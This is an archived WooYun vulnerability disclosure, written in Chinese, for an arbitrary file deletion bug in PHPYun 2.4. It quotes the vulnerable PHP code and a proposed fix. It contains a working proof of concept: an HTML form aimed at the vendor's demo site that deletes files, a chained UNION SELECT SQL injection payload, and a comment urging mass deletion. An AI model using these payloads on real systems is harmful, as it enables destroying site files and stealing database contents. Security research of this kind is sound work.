{"id": 16282, "wybug_id": "wooyun-2012-012960", "wybug_title": "PHP云人才系统 PHPYun任意文件删除", "wybug_corp": "PHP100", "wybug_author": "hacx", "wybug_date": "2012-10-01 21:16", "wybug_open_date": "2012-11-15 21:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-10-01：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-11-15：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： PHPYun任意文件删除，从而导致sql注射。 详细说明：  PHP云人才系统 PHPYun为 PHP100旗下产品。下载源码：http://www.phpyun.com/phpyun_2.4_GBK_Beta.zip 2.4版本的先看根目录下index.php文件：\n<?phpinclude(dirname(__FILE__).\"/global.php\");********省略***********$act = $_GET['act'];$task = $_GET['task'];********省略***********require(MODEL_PATH.'class/common.php');require(\"model/\".$act.'.class.php');//包含model/下的class.php文件$conclass=$act.'_controller';$actfunc=$task.'_action';$views=new $conclass($phpyun,$db,$db_config[\"def\"],\"index\");//实例化一个类if(!method_exists($views,$actfunc)){\t$views->DoException();}$views->$actfunc();//访问url:index.php?act=ajax&task=delupload将调用model/ajax.class.php中ajax_controller类的delupload_action函数?>\n来到根目录下的global.php\nerror_reporting(0);//关闭了错误显示........................................if($_GET[act]!=\"admin_template\"){\tinclude(CONFIG_PATH.\"db.safety.php\");//包含了data/db.safety.php文件}\n再看data/db.safety.php文件\n<?phpfunction quotesGPC() {\t$_POST = array_map(\"addSlash\", $_POST);\t$_GET = array_map(\"addSlash\", $_GET);\t$_COOKIE = array_map(\"addSlash\", $_COOKIE);}function addSlash($el) {\tif (is_array($el))\t\treturn array_map(\"addSlash\", $el);\telse\t\treturn addslashes($el);}function gpc2sql($str) {\t$arr=array(\" and \"=>\" an d \",\" or \"=>\" Ｏr \",\"%20\"=>\"\",\"select\"=>\"Ｓelect\",\"update\"=>\"Ｕpdate\",\"count\"=>\"Ｃount\",\"chr\"=>\"Ｃhr\",\"truncate\"=>\"Ｔruncate\",\"union\"=>\"Ｕnion\",\"delete\"=>\"Ｄelete\",\"insert\"=>\"Ｉnsert\");\tforeach($arr as $key=>$v){    \t$str = preg_replace('/'.$key.'/isU',$v,$str);\t}\treturn $str;}function common_htmlspecialchars($str){    $str = preg_replace('/&(?!#[0-9]+;)/s', '&amp;', $str);    $str = str_replace(    array('&','<','>','\"','and',\"'\"),    array(\"&amp;\",'&lt;','&gt;','&quot;','an d',\"&acute;\"),    $str);    return gpc2sql($str);}foreach($_POST  as $id=>$v){\t$_POST[$id]=common_htmlspecialchars($v);}foreach($_GET  as $id=>$v){\tif(!is_array($v))\t$v=substr(strip_tags($v),0,80);\t$_GET[$id]=common_htmlspecialchars($v);}foreach($_COOKIE  as $id=>$v){\t$v=substr(strip_tags($v),0,52);\t$_COOKIE[$id]=common_htmlspecialchars($v);}?>\n可以看到对$_POST、$_GET、$_COOKIE的值都进行了过滤、转义，XSS、sql注射都很难了。好了那么问题出在mode/ajax.class.php。来看mode/ajax.class.php中的delupload_action函数 \nfunction delupload_action(){\t\tif(!$this->uid || !$this->username || $_COOKIE[\"usertype\"]!=2){//需要先注册一个企业用户再登录，企业用户usertype为2，个人用户需要修改cookie\t\t\techo 0;die;\t\t}else{\t\t\t$dir=$_POST[str][0];\t//POST表单中设置[str][0]的值就可以删除任意文件了\t\t\techo @unlink(\".\".$dir);\t//调用了unlink函数删除文件\t\t}\t}\n构造html文件：\n<form action=\"http://demo.phpyun.com/index.php?act=ajax&task=delupload\" method=\"post\"><br>    要删除的文件:<input type=\"text\" name=\"str[0]\" value=\"/robots.txt\" size=120><br>    <input type=\"submit\" value=\"提交\"></form>\n提交后robots.txt文件删除了\n\n\n\n\n\n如果删除/data/phpyun.lock可以重新安装如果删除/data/db.safety.php则没有进行对$_POST、$_GET、$_COOKIE进行过滤了比如删除/data/db.safety.php后可通过mode/ajax.class.php中getzphcom_action函数进行sql注入：\nfunction getzphcom_action(){\t\textract($_GET);\t//$jobid=$_GET[\"jobid\"]\t\tif(!$jobid){\t\t\t$arr['status']=0;\t\t\t$arr['content']=iconv(\"gbk\",\"utf-8\",\"您还没有职位，<a href='index.php?act=login&usertype=2'>请先登录</a>\");\t\t}else{\t\t\t$row=$this->obj->DB_select_all(\"company_job\",\"`id` in ($jobid)\");//$jobid没有单引号，闭合前面的)即可进行注入\t\t\tforeach($row as $v){\t\t\t\t\t$data.=$v[name].'<br>';\t\t\t\t}\t\t\t$arr['status']=1;\t\t\t$arr['content']=iconv(\"gbk\",\"utf-8\",$data);\t\t}\t\techo json_encode($arr);\t}\n注入：访问/index.php?act=ajax&task=getzphcom&jobid=-1) UNION SELECT 1,2,concat(user(),0x7c,database()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30%23本地测试注入成功，demo.phpyun.com测试注入不成功。   漏洞证明：  \n\n   修复方案：  只允许用户删除用户上传的特定文件。   版权声明：转载请注明来源 hacx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2012-10-01 21:39 |    \t\tErrorera \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:21        | 我们应该在犯错误的情况下学习！)\t\t \n  果断写exp批量删除common.php over    \n     2012-11-16 09:54 |    \t\tca3tie1 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:4        | castiel)\t\t \n  二次利用很好很强大！！    \n     2012-11-29 14:33 |    \t\thack2012 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:3        | 关注信息安全 http://www.waitalone.cn/)\t\t \n  很强大！！！    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}